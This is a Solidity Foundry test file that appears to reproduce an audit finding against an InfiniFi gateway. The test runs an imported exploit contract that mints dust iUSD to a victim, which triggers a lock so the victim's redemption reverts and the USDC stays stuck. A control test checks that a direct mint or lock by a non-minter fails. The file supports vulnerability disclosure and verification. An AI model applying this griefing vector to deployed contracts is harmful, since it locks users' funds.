// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {
    Exploit,
    ReceiptToken,
    InfiniFiGateway,
    MockUSDC,
    Victim
} from "./55049-griefing-vector-via-arbitrary-minting-of-iusd-tokens-spearbi.sol";

contract InfiniFiMintGriefTest is Test {
    function test_exploit_dustMintBreaksVictimRedeem() public {
        Exploit e = new Exploit();
        e.run();

        console.log("ratio before", e.ratioBefore());
        console.log("ratio after", e.ratioAfter());
        console.log("victim iUSD", e.victimIusd());
        console.log("restricted until", e.restrictedUntil());
        console.log("redeem reverted", e.redeemReverted() ? 1 : 0);
        console.log("locked USDC", e.lockedUsdc());
        console.log("victim USDC after", e.victimUsdcAfter());

        assertEq(e.ratioBefore(), 1e18, "starting ratio");
        assertEq(e.ratioAfter(), 1e18, "ratio stayed backed");
        assertEq(e.victimIusd(), 1000 ether + 1, "dust iUSD credited to victim");
        assertEq(e.restrictedUntil(), block.timestamp + 1, "lock");
        assertTrue(e.redeemReverted(), "redeem did not revert");
        assertEq(e.victimUsdcAfter(), 0, "victim was paid");
        assertEq(e.lockedUsdc(), 1000 ether + 1, "USDC still in the gateway");
    }

    function test_control_onlyMinterMintsAndSelfMintDoesNotBrickVictim() public {
        Exploit e = new Exploit();
        ReceiptToken iusd = e.iusd();
        InfiniFiGateway gateway = e.gateway();
        MockUSDC usdc = e.usdc();
        Victim victim = e.victim();

        bool direct;
        try iusd.mint(address(this), 1) {
            direct = true;
        } catch {}
        assertFalse(direct, "non-minter minted iUSD");

        bool directLock;
        try iusd.restrictActionUntil(address(victim), block.timestamp + 1) {
            directLock = true;
        } catch {}
        assertFalse(directLock, "non-minter set a restriction");

        usdc.mint(address(victim), 1000 ether);
        victim.deposit(usdc, gateway, 1000 ether);
        assertEq(iusd.restrictedUntil(address(victim)), 0, "deposit locked the victim");

        usdc.mint(address(this), 1);
        usdc.approve(address(gateway), 1);
        gateway.mintSelf(1);
        assertEq(iusd.balanceOf(address(this)), 1, "self mint");
        assertEq(iusd.restrictedUntil(address(this)), block.timestamp + 1, "caller locked themselves");
        assertEq(iusd.restrictedUntil(address(victim)), 0, "self mint locked the victim");

        uint256 out = victim.redeem(gateway, 1000 ether);
        assertEq(out, 1000 ether, "owner redeem");
        assertEq(usdc.balanceOf(address(victim)), 1000 ether, "victim received USDC");
        assertEq(iusd.balanceOf(address(victim)), 0, "victim iUSD remains");
    }
}
